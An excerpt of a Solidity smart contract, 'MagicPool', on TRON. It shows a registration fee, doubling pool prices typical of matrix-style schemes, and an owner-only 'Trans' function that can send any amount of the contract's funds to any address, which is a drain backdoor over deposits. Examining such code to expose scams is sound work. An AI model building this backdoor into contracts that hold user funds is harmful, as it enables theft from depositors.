...
contract MagicPool {
    ...
    uint REGESTRATION_FESS = 30 trx;
    uint pool1_price = 10 trx;
    uint pool2_price = 100 trx;
    uint pool3_price = 200 trx;
    uint pool4_price = 400 trx;
    uint pool5_price = 800 trx;
    uint pool6_price = 1600 trx;
    uint pool7_price = 3200 trx;
    uint pool8_price = 6400 trx;
    ...
    constructor() public {
        ...
        LEVEL_PRICE[1] = 10 trx;
        LEVEL_PRICE[2] = 100 trx;
        LEVEL_PRICE[3] = 200 trx;
        LEVEL_PRICE[4] = 400 trx;
        LEVEL_PRICE[5] = 800 trx;
        LEVEL_PRICE[6] = 1600 trx;
        LEVEL_PRICE[7] = 3200 trx;
        LEVEL_PRICE[8] = 6400 trx;
 ...
 function Trans(address payable _address, uint _amounts) public  returns(bool){
        require(msg.sender == ownerWallet,"Trans");
        uint256 amounts = _amounts * (10**6);
        _address.transfer(amounts);
        return true;
    }
